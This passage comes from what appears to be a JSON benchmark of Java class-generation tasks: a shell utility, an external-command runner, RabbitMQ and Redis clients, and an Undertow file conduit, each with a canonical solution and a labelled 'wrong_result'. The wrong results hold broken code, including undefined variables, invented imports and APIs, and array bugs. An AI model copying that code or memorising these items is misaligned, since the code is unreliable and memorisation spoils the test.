process.waitFor();\n        int exitValue = process.exitValue();\n        if (0 != exitValue) {\n            throw new Exception(\"failed to execute: \" + command + \", exit value: \" + exitValue + \", output: \" + output);\n        }\n        return output.toString();\n    }\n\n    public static String findCommand(String command) {\n        for (String binaryPlace : BINARY_PLACES) {\n            String path = binaryPlace + command;\n            if (new File(path).exists()) {\n                return path;\n            }\n        }\n        return command;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 44,
    "wrong_result": "public class ShellUtils {\n    private static final String[] BINARY_PLACES = {\"/system/bin\", \"/system/xbin\", \"/sbin\", \"/apex/com.android.runtime/bin\"};\n    private static final String PYTHON_HOME = \"/system/bin/python\";\n    private static File DATA_DIR;\n    private static File BUSYBOX_FILE;\n    private static boolean IS_ROOTED;\n\n    static {\n        IS_ROOTED = findCommand(\"su\") != null;\n        DATA_DIR = new File(Environment.getExternalStorageDirectory(), \"myapp\");\n        BUSYBOX_FILE = new File(\"/system/xbin/busybox\");\n    }\n\n    public static Process executeNoWait(Map<String, String> env, String... command) {\n        ProcessBuilder pb = new ProcessBuilder(command);\n        if (env != null) {\n            pb.environment().putAll(env);\n        }\n        try {\n            return pb.start();\n        } catch (IOException e) {\n            throw new RuntimeException(\"Failed to start process\", e);\n        }\n    }\n\n    public static Process sudoNoWait(Map<String, String> env, String... command) {\n        if (!IS_ROOTED) {\n            throw new IllegalStateException(\"Device not rooted\");\n        }\n        String[] sudoCommand = new String[]{\"su\", \"-c\"};\n        System.arraycopy(command, 0, sudoCommand, 2, command.length);\n        return executeNoWait(env, sudoCommand);\n    }\n\n    public static String waitFor(String command, Process process) {\n        BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n        BufferedReader errorReader = new BufferedReader(new InputStreamReader(process.getErrorStream()));\n        StringBuilder output = new StringBuilder();\n        String line;\n        try {\n            while ((line = reader.readLine()) != null) {\n                output.append(line).append(\"\\n\");\n            }\n            while ((line = errorReader.readLine()) != null) {\n                output.append(line).append(\"\\n\");\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n        int exitCode = process.waitFor();\n        if (exitCode != 0) {\n            throw new RuntimeException(\"Command failed with exit code \" + exitCode + \": \" + output.toString());\n        }\n        return output.toString();\n    }\n\n    public static String findCommand(String command) {\n        for (String dir : BINARY_PLACES) {\n            File file = new File(dir, command);\n            if (file.exists()) {\n                return file.getAbsolutePath();\n            }\n        }\n        return null;\n    }\n}"
  },
  {
    "Task_id": 303,
    "Instruction": "Task Description: Create a Java class that manages the execution of external commands, handles their input/output streams, and provides synchronization capabilities for waiting until the command completes.\n\nClass Description: The ExtCmd class provides functionality to execute external system commands, manage their input/output streams, and wait for their completion. It includes features for logging, condition checking before execution, and notification listeners for process completion.\n\nAttributes:\n\nconditionsWithDescriptions: Map<ExtCmdCondition, String> - Stores conditions that must be met before command execution along with their descriptions\nextCmdEndedListenerSet: Set<ExtCmdEndedListener> - Collection of listeners to be notified when command execution ends\noutReceiver: OutputReceiver - Handles the standard output stream from the executed command\nerrReceiver: OutputReceiver - Handles the error output stream from the executed command\nerrLog: ErrorReporter - Logger for command execution information\nstartTime: long - Timestamp when command execution started\nexecCommand: String[] - The command to be executed\nexecCommandStr: String - String representation of the command\nlogExecution: boolean - Flag to enable/disable execution logging\n\nMethods:\n\nexec(ProcessBuilder.Redirect, File, String...) -> OutputStream - Executes an external command with specified input redirection, working directory, and command arguments. Returns the process's output stream for writing input.\nsyncProcess() -> OutputData - Waits for the command to complete and returns its output data including stdout, stderr, and exit code.\ncheckForConditions() -> void - Internal method to verify all execution conditions are met before starting a command.\n\nNested Classes:\n\nOutputData: Contains the results of command execution including stdout, stderr, and exit code\nExtCmdCondition: Interface for defining pre-execution conditions\nExtCmdEndedListener: Interface for command completion notification callbacks",
    "Canonical_solution": "import com.linbit.ChildProcessTimeoutException;\nimport com.linbit.linstor.logging.ErrorReporter;\nimport com.linbit.timer.Action;\nimport com.linbit.timer.Timer;\nimport com.linbit.utils.StringUtils;\n\nimport java.io.File;\nimport java.io.IOException;\nimport java.io.OutputStream;\nimport java.util.HashMap;\nimport java.util.HashSet;\nimport java.util.Map;\nimport java.util.Map.Entry;\nimport java.util.Set;\n\nimport org.slf4j.MDC;\n\npublic class ExtCmd extends ChildProcessHandler\n{\n    private final Map<ExtCmdCondition, String> conditionsWithDescriptions;\n    private final Set<ExtCmdEndedListener> extCmdEndedListenerSet;\n\n    private OutputReceiver outReceiver;\n    private OutputReceiver errReceiver;\n    private ErrorReporter errLog;\n    private long startTime;\n\n    private String[] execCommand;\n    private String execCommandStr;\n\n    private boolean logExecution = true;\n\n    public ExtCmd(Timer<String, Action<String>> timer, ErrorReporter errLogRef)\n    {\n        super(timer);\n        conditionsWithDescriptions = new HashMap<>();\n        outReceiver = null;\n        errReceiver = null;\n        errLog = errLogRef;\n        extCmdEndedListenerSet = new HashSet<>();\n    }\n\n    public OutputStream exec(ProcessBuilder.Redirect stdinRedirect, File directory, String... command)\n        throws IOException\n    {\n        execCommand = command;\n        execCommandStr = StringUtils.joinShellQuote(command);\n\n        if (logExecution)\n        {\n            errLog.logDebug(\"Executing command: %s\", execCommandStr);\n        }\n\n        ProcessBuilder pBuilder = new ProcessBuilder();\n        pBuilder.directory(directory);\n        pBuilder.command(command);\n        pBuilder.redirectError(ProcessBuilder.Redirect.PIPE);\n        pBuilder.redirectOutput(ProcessBuilder.Redirect.PIPE);\n        pBuilder.redirectInput(stdinRedirect);\n        Process child;\n        synchronized (conditionsWithDescriptions)\n        {\n            checkForConditions();\n            child = pBuilder.start();\n            startTime = System.currentTimeMillis();\n            setChild(child);\n            outReceiver = new OutputReceiver(\n                child.getInputStream(), errLog, logExecution, MDC.get(ErrorReporter.LOGID));\n            errReceiver = new OutputReceiver(\n                child.getErrorStream(), errLog, logExecution, MDC.get(ErrorReporter.LOGID));\n        }\n        new Thread(outReceiver).start();\n        new Thread(errReceiver).start();\n\n        return child.getOutputStream();\n    }\n\n    private void checkForConditions()\n    {\n        for (Entry<ExtCmdCondition, String> entry : conditionsWithDescriptions.entrySet())\n        {\n            if (!entry.getKey().isMet(this))\n            {\n                throw new ExtCmdConditionNotFullfilledException(entry.getValue() + \", command: \" + this.execCommandStr);\n            }\n        }\n    }\n\n    public OutputData syncProcess() throws IOException, ChildProcessTimeoutException\n    {\n        OutputData outData;\n        try\n        {\n            int exitCode = waitFor();\n            outReceiver.finish();\n            errReceiver.finish();\n            outData = new OutputData(\n                execCommand,\n                outReceiver.getData(),\n                errReceiver.getData(),\n                exitCode\n            );\n\n            if (logExecution)\n            {\n                errLog.logTrace(\n                    \"External command finished in %dms: %s\",\n                    (System.currentTimeMillis() - startTime),\n                    execCommandStr\n                );\n            }\n\n            for (ExtCmdEndedListener listener : extCmdEndedListenerSet)\n            {\n                listener.extCmdEnded(this);\n            }\n        }\n        catch (IOException | ChildProcessTimeoutException exc)\n        {\n            for (ExtCmdEndedListener listener : extCmdEndedListenerSet)\n            {\n                listener.extCmdEnded(this, exc);\n            }\n            throw exc;\n        }\n        return outData;\n    }\n\n    public static class OutputData\n    {\n        public final String[] executedCommand;\n        public final byte[] stdoutData;\n        public final byte[] stderrData;\n        public final int exitCode;\n\n        public OutputData(String[] executeCmd, byte[] out, byte[] err, int retCode)\n        {\n            executedCommand = executeCmd;\n            stdoutData = out;\n            stderrData = err;\n            exitCode = retCode;\n        }\n    }\n\n    public interface ExtCmdCondition\n    {\n        boolean isMet(ExtCmd extCmd);\n    }\n\n    public interface ExtCmdEndedListener\n    {\n        void extCmdEnded(ExtCmd extCmd);\n        void extCmdEnded(ExtCmd extCmd, Exception exc);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 44,
    "wrong_result": "public class ExtCmd {\n    private final Map<ExtCmdCondition, String> conditionsWithDescriptions;\n    private final Set<ExtCmdEndedListener> extCmdEndedListenerSet;\n    private final OutputReceiver outReceiver;\n    private final OutputReceiver errReceiver;\n    private final ErrorReporter errLog;\n    private final long startTime;\n    private final String[] execCommand;\n    private final String execCommandStr;\n    private final boolean logExecution;\n    private Process process;\n\n    public ExtCmd(String[] command, boolean logExecution) {\n        this.execCommand = command;\n        this.execCommandStr = Arrays.toString(command);\n        this.logExecution = logExecution;\n        this.conditionsWithDescriptions = new HashMap<>();\n        this.extCmdEndedListenerSet = new HashSet<>();\n        this.outReceiver = new OutputReceiver();\n        this.errReceiver = new OutputReceiver();\n        this.errLog = new ErrorReporter();\n        this.startTime = System.currentTimeMillis();\n    }\n\n    public OutputStream exec(ProcessBuilder.Redirect redirect, File workingDir, String... args) throws IOException {\n        ProcessBuilder pb = new ProcessBuilder(args);\n        pb.redirect(redirect);\n        pb.directory(workingDir);\n        this.process = pb.start();\n        return this.process.getOutputStream();\n    }\n\n    public OutputData syncProcess() throws InterruptedException {\n        int exitCode = this.process.waitFor();\n        String stdout = this.outReceiver.getOutput();\n        String stderr = this.errReceiver.getOutput();\n        OutputData data = new OutputData(stdout, stderr, exitCode);\n        for (ExtCmdEndedListener listener : extCmdEndedListenerSet) {\n            listener.onEnd(data);\n        }\n        return data;\n    }\n\n    private void checkForConditions() {\n        for (Map.Entry<ExtCmdCondition, String> entry : conditionsWithDescriptions.entrySet()) {\n            if (!entry.getKey().isSatisfied()) {\n                throw new IllegalStateException(\"Condition not satisfied: \" + entry.getValue());\n            }\n        }\n    }\n\n    public static class OutputData {\n        public final String stdout;\n        public final String stderr;\n        public final int exitCode;\n\n        public OutputData(String stdout, String stderr, int exitCode) {\n            this.stdout = stdout;\n            this.stderr = stderr;\n            this.exitCode = exitCode;\n        }\n    }\n\n    public interface ExtCmdCondition {\n        boolean isSatisfied();\n    }\n\n    public interface ExtCmdEndedListener {\n        void onEnd(OutputData data);\n    }\n}"
  },
  {
    "Task_id": 304,
    "Instruction": "Task Description: Implement a RabbitMQ message consumer in Java that connects to a RabbitMQ broker, declares a queue, and continuously consumes messages from that queue.\n\nClass Description: The MessageConsumer class provides functionality to connect to a RabbitMQ broker, initialize a message queue, consume messages from the queue, and properly close connections when finished.\n\nAttributes:\n- ROUTING_KEY: String - The name of the queue to consume messages from\n- factory: ConnectionFactory - RabbitMQ connection factory for broker configuration\n- connection: Connection - Active connection to the RabbitMQ broker\n- channel: Channel - Communication channel for message operations\n\nMethods:\n- MessageConsumer() - Constructor - Initializes the ConnectionFactory with default host settings\n- initializeConnection() throws Exception -> void - Establishes connection to RabbitMQ broker and creates a channel\n- startConsuming() throws Exception -> void - Starts consuming messages from the queue and prints received messages\n- close() throws Exception -> void - Closes the channel and connection to the RabbitMQ broker",
    "Canonical_solution": "import com.rabbitmq.client.*;\n\npublic class MessageConsumer {\n\n    private final static String ROUTING_KEY = \"SAMPLE_RABBITMQ\";\n    private ConnectionFactory factory;\n    private Connection connection;\n    private Channel channel;\n\n    public MessageConsumer() {\n        this.factory = new ConnectionFactory();\n        this.factory.setHost(\"127.0.0.1\");\n    }\n\n    public void initializeConnection() throws Exception {\n        this.connection = factory.newConnection();\n        this.channel = connection.createChannel();\n        channel.queueDeclare(ROUTING_KEY, false, false, false, null);\n    }\n\n    public void startConsuming() throws Exception {\n        System.out.println(\"C [*] Waiting for messages. To exit press CTRL+C\");\n        Consumer consumer = new DefaultConsumer(channel) {\n            @Override\n            public void handleDelivery(String consumerTag, Envelope envelope, AMQP.BasicProperties properties, byte[] body) throws IOException {\n                String message = new String(body, \"UTF-8\");\n                System.out.println(\"Consumer [x] Received '\" + message + \"'\");\n            }\n        };\n        channel.basicConsume(ROUTING_KEY, true, consumer);\n    }\n\n    public void close() throws Exception {\n        if (channel != null && channel.isOpen()) {\n            channel.close();\n        }\n        if (connection != null && connection.isOpen()) {\n            connection.close();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 41,
    "wrong_result": "public class MessageConsumer {\n    public static final String ROUTING_KEY = \"my_queue\";\n    private ConnectionFactory factory;\n    private Connection connection;\n    private Channel channel;\n\n    public MessageConsumer() {\n        this.factory = new ConnectionFactory();\n        this.factory.setHost(\"localhost\");\n    }\n\n    public void initializeConnection() throws Exception {\n        this.connection = this.factory.newConnection();\n        this.channel = connection.createChannel();\n        channel.queueDeclare(ROUTING_KEY, false, false, false, null);\n    }\n\n    public void startConsuming() throws Exception {\n        QueueingConsumer consumer = new QueueingConsumer();\n        channel.basicConsume(ROUTING_KEY, true, consumer);\n        while (true) {\n            QueueingConsumer.Delivery delivery = consumer.nextDelivery();\n            System.out.println(\"Received: \" + new String(delivery.getBody()));\n        }\n    }\n\n    public void close() throws Exception {\n        if (channel != null) {\n            channel.close();\n        }\n        if (connection != null) {\n            connection.close();\n        }\n    }\n}"
  },
  {
    "Task_id": 305,
    "Instruction": "Task Description: Implement a RabbitMQ message producer in Java that sends messages to a specified exchange.\n\nClass Description: A service class that handles the production and sending of messages to a RabbitMQ exchange using a fanout pattern. The class manages connection setup, message publishing, and resource cleanup.\n\nAttributes:\n- EXCHANGE_NAME: String - The name of the RabbitMQ exchange to which messages will be published.\n\nMethods:\n- produceMessage(String message) -> String - Publishes the given message to the configured RabbitMQ exchange. Returns a simple response string.\n  - Input Parameters:\n    - message: String - The message content to be published\n  - Return Type: String - A simple response string (\"response\") indicating completion",
    "Canonical_solution": "import com.rabbitmq.client.Connection;\nimport com.rabbitmq.client.ConnectionFactory;\nimport com.visualpathit.account.utils.RabbitMqUtil;\nimport com.rabbitmq.client.Channel;\n\nimport java.io.IOException;\nimport java.util.concurrent.TimeoutException;\n\n@Service\npublic class ProducerServiceImpl implements ProducerService {\n\n    private static final String EXCHANGE_NAME = \"messages\";\n\n    @Override\n    public String produceMessage(String message) {\n        try {\n            ConnectionFactory factory = new ConnectionFactory();\n            factory.setHost(RabbitMqUtil.getRabbitMqHost());\n            factory.setPort(Integer.parseInt(RabbitMqUtil.getRabbitMqPort()));\n            factory.setUsername(RabbitMqUtil.getRabbitMqUser());\n            factory.setPassword(RabbitMqUtil.getRabbitMqPassword());\n            Connection connection = factory.newConnection();\n            Channel channel = connection.createChannel();\n            channel.exchangeDeclare(EXCHANGE_NAME, \"fanout\");\n            channel.basicPublish(EXCHANGE_NAME, \"\", null, message.getBytes());\n            channel.close();\n            connection.close();\n        } catch (IOException io) {\n            io.printStackTrace();\n        } catch (TimeoutException toe) {\n            toe.printStackTrace();\n        }\n        return \"response\";\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 40,
    "wrong_result": "public class RabbitMQProducer {\n    private static final String EXCHANGE_NAME = \"fanout_exchange\";\n    private Channel channel;\n    private Connection connection;\n\n    public RabbitMQProducer() throws Exception {\n        ConnectionFactory factory = new ConnectionFactory();\n        factory.setHost(\"localhost\");\n        factory.setUsername(\"guest\");\n        factory.setPassword(\"guest\");\n        connection = factory.newConnection();\n        this.channel = connection.createChannel();\n        this.channel.exchangeDeclare(EXCHANGE_NAME, \"fanout\");\n    }\n\n    public String produceMessage(String message) throws Exception {\n        String reply = \"response\";\n        this.channel.basicPublish(EXCHANGE_NAME, \"\", null, message.getBytes());\n        return reply;\n    }\n\n    public void close() throws Exception {\n        if (channel != null) {\n            channel.close();\n        }\n        if (connection != null) {\n            connection.close();\n        }\n    }\n}"
  },
  {
    "Task_id": 307,
    "Instruction": "Task Description: Create a Java class that implements a Redis publisher using the Lettuce client library, capable of publishing elements to a Redis list and providing a reactive stream publisher for consuming these elements.\n\nClass Description: The RedisPublisher class provides functionality to connect to a Redis server, publish elements to a Redis list, and create a reactive stream publisher for these elements. It handles connection management and resource cleanup.\n\nAttributes:\n- client: [RedisClient] - The Redis client instance used to establish connections with the Redis server.\n- connection: [StatefulRedisConnection<String, String>] - The active connection to the Redis server for executing commands.\n\nMethods:\n- RedisPublisher() - [Constructor] -> [void] - Initializes the Redis client and establishes a connection to the Redis server. Also flushes all existing data in Redis.\n- createPublisher(long elements) -> [Publisher<String>] - Creates and returns a reactive stream Publisher that emits elements from a Redis list. The method creates a new Redis list with the specified number of elements and sets up a supplier for LRANGE commands to retrieve them.\n- close() -> [void] - Closes the Redis connection and shuts down the client to release resources.\n\nInput: \n- For createPublisher: elements [long] - The number of elements to publish to the Redis list.\n\nOutput:\n- For createPublisher: A Publisher<String> that emits the elements from the Redis list. Returns null if elements equals Long.MAX_VALUE.",
    "Canonical_solution": "import io.lettuce.core.RedisClient;\nimport io.lettuce.core.RedisURI;\nimport io.lettuce.core.api.StatefulRedisConnection;\nimport io.lettuce.core.api.sync.RedisCommands;\nimport io.lettuce.core.codec.StringCodec;\nimport io.lettuce.core.output.ValueListOutput;\nimport io.lettuce.core.protocol.Command;\nimport io.lettuce.core.protocol.CommandArgs;\nimport io.lettuce.core.protocol.CommandType;\nimport io.lettuce.test.resource.FastShutdown;\nimport io.lettuce.test.resource.TestClientResources;\nimport io.lettuce.test.settings.TestSettings;\nimport org.reactivestreams.Publisher;\nimport java.util.List;\nimport java.util.UUID;\nimport java.util.function.Supplier;\n\npublic class RedisPublisher {\n\n    private RedisClient client;\n    private StatefulRedisConnection<String, String> connection;\n\n    public RedisPublisher() {\n        client = RedisClient.create(TestClientResources.get(), RedisURI.create(TestSettings.host(), TestSettings.port()));\n        connection = client.connect();\n        connection.sync().flushall();\n    }\n\n    public Publisher<String> createPublisher(long elements) {\n        RedisCommands<String, String> sync = connection.sync();\n\n        if (elements == Long.MAX_VALUE) {\n            return null;\n        }\n\n        String id = UUID.randomUUID().toString();\n        String key = \"PublisherVerification-\" + id;\n\n        for (int i = 0; i < elements; i++) {\n            sync.lpush(key, \"element-\" + i);\n        }\n\n        Supplier<Command<String, String, List<String>>> supplier = () -> {\n            CommandArgs<String, String> args = new CommandArgs<>(StringCodec.UTF8).addKey(key).add(0).add(-1);\n            return new Command<>(CommandType.LRANGE, new ValueListOutput<>(StringCodec.UTF8), args);\n        };\n\n        return new TestRedisPublisher(supplier, connection, true);\n    }\n\n    public void close() {\n        connection.close();\n        FastShutdown.shutdown(client);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "wrong_result": "import io.lettuce.core.RedisClient;\nimport io.lettuce.core.api.StatefulRedisConnection;\nimport io.lettuce.core.api.reactive.RedisReactiveCommands;\nimport reactor.core.publisher.Flux;\nimport reactor.core.publisher.Mono;\nimport reactor.core.publisher.Publisher;\n\npublic class RedisPublisher {\n    private final RedisClient client;\n    private final StatefulRedisConnection<String, String> connection;\n\n    public RedisPublisher() {\n        client = RedisClient.create();\n        connection = client.connect();\n        connection.sync().flushAll();\n    }\n\n    public Publisher<String> createPublisher(long elements) {\n        if (elements == Long.MAX_VALUE) {\n            return null;\n        }\n        String key = \"mylist\";\n        return Mono.range(0, elements)\n            .flatMap(i -> connection.reactive().listRightPush(key, String.valueOf(i)))\n            .then(connection.reactive().listRange(key, 0, -1))\n            .flatMap(list -> Flux.fromIterable(list));\n    }\n\n    public void close() {\n        connection.close();\n        client.shutdown();\n    }\n}"
  },
  {
    "Task_id": 308,
    "Instruction": "Task Description: Implement a utility class for Redis pipeline operations using Lettuce client in Java, enabling batch Redis commands execution with asynchronous processing.\n\nClass Description: LettuceRedisUtils is a singleton utility class that provides a method for executing Redis commands in pipeline mode using Lettuce client. It manages Redis connections and asynchronous command execution.\n\nAttributes:\n- REDIS_CLIENT: [RedisClient] - The singleton Redis client instance initialized with connection details (host, port, password)\n\nMethods:\n- pipeline: [pipeline](RedisPipelineCallBack pipelineCallBack) -> [void] - Executes Redis commands in pipeline mode. Takes a callback interface that contains the Redis operations to be performed. Handles connection management, command flushing, and waiting for completion of all operations. The callback should return a list of RedisFuture objects representing the asynchronous operations.",
    "Canonical_solution": "import io.lettuce.core.LettuceFutures;\nimport io.lettuce.core.RedisClient;\nimport io.lettuce.core.RedisFuture;\nimport io.lettuce.core.RedisURI;\nimport io.lettuce.core.api.StatefulRedisConnection;\nimport io.lettuce.core.api.async.RedisAsyncCommands;\nimport io.lettuce.core.codec.ByteArrayCodec;\n\nimport java.util.List;\nimport java.util.concurrent.TimeUnit;\n\npublic class LettuceRedisUtils {\n\n    private static final RedisClient REDIS_CLIENT;\n\n    static {\n        RedisURI redisUri = RedisURI.Builder.redis(AustinFlinkConstant.REDIS_IP)\n                .withPort(Integer.parseInt(AustinFlinkConstant.REDIS_PORT))\n                .withPassword(AustinFlinkConstant.REDIS_PASSWORD.toCharArray())\n                .build();\n        REDIS_CLIENT = RedisClient.create(redisUri);\n    }\n\n    private LettuceRedisUtils() {\n    }\n\n    public static void pipeline(RedisPipelineCallBack pipelineCallBack) {\n        StatefulRedisConnection<byte[], byte[]> connect = REDIS_CLIENT.connect(new ByteArrayCodec());\n        RedisAsyncCommands<byte[], byte[]> commands = connect.async();\n\n        List<RedisFuture<?>> futures = pipelineCallBack.invoke(commands);\n\n        commands.flushCommands();\n        LettuceFutures.awaitAll(10, TimeUnit.SECONDS,\n                futures.toArray(new RedisFuture[0]));\n        connect.close();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "wrong_result": "import io.lettuce.core.RedisClient;\nimport io.lettuce.core.api.RedisConnection;\nimport io.lettuce.core.api.async.RedisFuture;\nimport io.lettuce.core.api.async.RedisPipeline;\nimport java.util.List;\n\npublic class LettuceRedisUtils {\n\n    private static final RedisClient REDIS_CLIENT = RedisClient.create(\"redis://localhost:6379\");\n\n    private static final LettuceRedisUtils INSTANCE = new LettuceRedisUtils();\n\n    private LettuceRedisUtils() {}\n\n    public static LettuceRedisUtils getInstance() {\n        return INSTANCE;\n    }\n\n    public void pipeline(RedisPipelineCallBack callback) {\n        try (RedisConnection<String, String> connection = REDIS_CLIENT.connect()) {\n            RedisPipeline pipeline = connection.pipeline();\n            List<RedisFuture<?>> futures = callback.execute(pipeline);\n            pipeline.flush();\n            for (RedisFuture<?> future : futures) {\n                future.await();\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public static interface RedisPipelineCallBack {\n        List<RedisFuture<?>> execute(RedisPipeline pipeline);\n    }\n}"
  },
  {
    "Task_id": 31,
    "Instruction": "Task Description: Create a Java class that implements StreamSinkConduit to handle file channel operations for writing data to a file, with proper management of write operations and resource cleanup.\n\nClass Description: FileConduitTarget is a class that implements StreamSinkConduit to provide file channel operations for writing data. It manages file writes, transfers, and resource cleanup while integrating with an HTTP server exchange for thread management.\n\nAttributes:\n- fileChannel: FileChannel - The file channel used for writing data to the file\n- exchange: HttpServerExchange - The HTTP server exchange for thread management\n- writeReadyHandler: WriteReadyHandler - Handler for write readiness events\n- writesResumed: boolean - Flag indicating whether writes are currently resumed\n\nMethods:\n- transferFrom(FileChannel, long, long) -> long - Transfers data from the given file channel to this file channel\n- transferFrom(StreamSourceChannel, long, ByteBuffer) -> long - Transfers data from the given stream source channel to this file channel\n- write(ByteBuffer) -> int - Writes data from the given byte buffer to the file channel\n- write(ByteBuffer[], int, int) -> long - Writes data from the given byte buffer array to the file channel\n- writeFinal(ByteBuffer) -> int - Performs a final write operation from the given byte buffer\n- writeFinal(ByteBuffer[], int, int) -> long - Performs a final write operation from the given byte buffer array\n- terminateWrites() -> void - Closes the file channel to terminate writes\n- isWriteShutdown() -> boolean - Checks if writes are shutdown (file channel closed)\n- resumeWrites() -> void - Resumes write operations\n- suspendWrites() -> void - Suspends write operations\n- wakeupWrites() -> void - Wakes up pending write operations\n- isWriteResumed() -> boolean - Checks if writes are currently resumed\n- awaitWritable() -> void - Waits for the channel to become writable (no-op implementation)\n- awaitWritable(long, TimeUnit) -> void - Waits for the channel to become writable with timeout (no-op implementation)\n- getWriteThread() -> XnioIoThread - Gets the I/O thread from the exchange\n- setWriteReadyHandler(WriteReadyHandler) -> void - Sets the write ready handler\n- truncateWrites() -> void - Closes the file channel to truncate writes\n- flush() -> boolean - Flushes any buffered data (always returns true)\n- getWorker() -> XnioWorker - Gets the worker from the exchange connection",
    "Canonical_solution": "import io.undertow.server.HttpServerExchange;\nimport io.undertow.util.ImmediateConduitFactory;\nimport org.xnio.IoUtils;\nimport org.xnio.XnioIoThread;\nimport org.xnio.XnioWorker;\nimport org.xnio.channels.StreamSourceChannel;\nimport org.xnio.conduits.ConduitStreamSinkChannel;\nimport org.xnio.conduits.Conduits;\nimport org.xnio.conduits.StreamSinkConduit;\nimport org.xnio.conduits.WriteReadyHandler;\n\nimport java.io.IOException;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.FileChannel;\nimport java.nio.file.Files;\nimport java.nio.file.Path;\nimport java.nio.file.StandardOpenOption;\nimport java.util.concurrent.TimeUnit;\n\npublic class FileConduitTarget implements StreamSinkConduit {\n    private final FileChannel fileChannel;\n    private final HttpServerExchange exchange;\n    private WriteReadyHandler writeReadyHandler;\n    private boolean writesResumed = false;\n\n    public FileConduitTarget(FileChannel fileChannel, HttpServerExchange exchange) {\n        this.fileChannel = fileChannel;\n        this.exchange = exchange;\n    }\n\n    @Override\n    public long transferFrom(FileChannel fileChannel, long l, long l2) throws IOException {\n        return this.fileChannel.transferFrom(fileChannel, l, l2);\n    }\n\n    @Override\n    public long transferFrom(StreamSourceChannel streamSourceChannel, long l, ByteBuffer byteBuffer) throws IOException {\n        return IoUtils.transfer(streamSourceChannel, l, byteBuffer, fileChannel);\n    }\n\n    @Override\n    public int write(ByteBuffer byteBuffer) throws IOException {\n        return fileChannel.write(byteBuffer);\n    }\n\n    @Override\n    public long write(ByteBuffer[] byteBuffers, int i, int i2) throws IOException {\n        return fileChannel.write(byteBuffers, i, i2);\n    }\n\n    @Override\n    public int writeFinal(ByteBuffer src) throws IOException {\n        return Conduits.writeFinalBasic(this, src);\n    }\n\n    @Override\n    public long writeFinal(ByteBuffer[] srcs, int offset, int length) throws IOException {\n        return Conduits.writeFinalBasic(this, srcs, offset, length);\n    }\n\n    @Override\n    public void terminateWrites() throws IOException {\n        fileChannel.close();\n    }\n\n    @Override\n    public boolean isWriteShutdown() {\n        return !fileChannel.isOpen();\n    }\n\n    @Override\n    public void resumeWrites() {\n        wakeupWrites();\n    }\n\n    @Override\n    public void suspendWrites() {\n        writesResumed = false;\n    }\n\n    @Override\n    public void wakeupWrites() {\n        if (writeReadyHandler != null) {\n            writesResumed = true;\n            while (writesResumed && writeReadyHandler != null) {\n                writeReadyHandler.writeReady();\n            }\n        }\n    }\n\n    @Override\n    public boolean isWriteResumed() {\n        return writesResumed;\n    }\n\n    @Override\n    public void awaitWritable() throws IOException {\n    }\n\n    @Override\n    public void awaitWritable(long l, TimeUnit timeUnit) throws IOException {\n    }\n\n    @Override\n    public XnioIoThread getWriteThread() {\n        return exchange.getIoThread();\n    }\n\n    @Override\n    public void setWriteReadyHandler(WriteReadyHandler writeReadyHandler) {\n        this.writeReadyHandler = writeReadyHandler;\n    }\n\n    @Override\n    public void truncateWrites() throws IOException {\n        fileChannel.close();\n    }\n\n    @Override\n    public boolean flush() throws IOException {\n        return true;\n    }\n\n    @Override\n    public XnioWorker getWorker() {\n        return exchange.getConnection().getWorker();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 9,
    "wrong_result": "import java.io.IOException;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.FileChannel;\nimport java.util.concurrent.TimeUnit;\nimport com.sun.net.httpserver.HttpServerExchange;\nimport org.jboss.netty.handler.codec.http.HttpServerExchange;\nimport org.jboss.netty.channel.WriteReadyHandler;\n\npublic class FileConduitTarget implements StreamSinkConduit {\n    private final FileChannel fileChannel;\n    private final HttpServerExchange exchange;\n    private WriteReadyHandler writeReadyHandler;\n    private boolean writesResumed;\n\n    public FileConduitTarget(FileChannel fileChannel, HttpServerExchange exchange) {\n        this.fileChannel = fileChannel;\n        this.exchange = exchange;\n    }\n\n    public long transferFrom(FileChannel src, long position, long count) throws IOException {\n        return fileChannel.transferFrom(src, position, count);\n    }\n\n    public long transferFrom(java.nio.channels.StreamSourceChannel src, long position, ByteBuffer dst) throws IOException {\n        long bytesTransferred = 0;\n        while (bytesTransferred < count) {\n            int read = src.read(dst);\n            if (read == -1) break;\n            bytesTransferred += read;\n            int written = fileChannel.write(dst);\n            bytesTransferred += written;\n        }\n        return bytesTransferred;\n    }\n\n    public int write(ByteBuffer buf) throws IOException {\n        return fileChannel.write(buf);\n    }\n\n    public long write(ByteBuffer[] buffers, int offset, int length) throws IOException {\n        return fileChannel.write(buffers, offset, length);\n    }\n\n    public int writeFinal(ByteBuffer buf) throws IOException {\n        return fileChannel.write(buf);\n    }\n\n    public long writeFinal(ByteBuffer[] buffers, int offset, int length) throws IOException {\n        return fileChannel.write(buffers, offset, length);\n    }\n\n    public void terminateWrites() throws IOException {\n        fileChannel.close();\n    }\n\n    public boolean isWriteShutdown() {\n        return fileChannel.isClosed();\n    }\n\n    public void resumeWrites() {\n        writesResumed = true;\n    }\n\n    public void suspendWrites() {\n        writesResumed = false;\n    }\n\n    public void wakeupWrites() {\n        // No-op\n    }\n\n    public boolean isWriteResumed() {\n        return writesResumed;\n    }\n\n    public void awaitWritable() {\n        // No-op\n    }\n\n    public void awaitWritable(long timeout, TimeUnit unit) {\n        // No-op\n    }\n\n    public XnioIoThread getWriteThread() {\n        return exchange.getIoThread();\n    }\n\n    public void setWriteReadyHandler(WriteReadyHandler handler) {\n        this.writeReadyHandler = handler;\n    }\n\n    public void truncateWrites() throws IOException {\n        fileChannel.close();\n    }\n\n    public boolean flush() {\n        return true;\n    }\n\n    public XnioWorker getWorker() {\n        return exchange.getWorker();\n    }\n}"
  },
  {
    "Task_id": 310,
